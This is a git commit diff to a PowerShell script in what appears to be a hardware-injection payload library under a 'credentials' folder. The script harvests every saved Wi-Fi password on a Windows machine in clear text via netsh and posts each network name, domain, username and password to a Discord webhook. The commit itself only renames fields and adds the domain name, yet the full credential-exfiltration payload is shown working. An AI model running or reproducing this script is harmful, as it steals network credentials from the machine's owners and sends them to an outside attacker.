157cdcbc548eba6bffcc1d08120dd092d12fff02
sevensamuraisquirrels <138519585+sevensamuraisquirrels@users.noreply.github.com>
2023-07-04 22:22:41 -0400

    Full username

--- payloads/library/credentials/WLAN-Windows-Passwords/Windows-Passwords.ps1
+++ payloads/library/credentials/WLAN-Windows-Passwords/Windows-Passwords.ps1
@@ -1,12 +1,12 @@
 
-# ENG
+# WLAN
 netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
     $wlan  = $_.Matches.Value
-    $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
+    $message = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
 
 	$Body = @{
-		'username' = $env:username + " | " + [string]$wlan
-		'content' = [string]$passw
+		'user' = $env:DomainName + "\" + $env:username + " | " + [string]$wlan
+		'message' = [string]$message
 	}
 	
 	Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
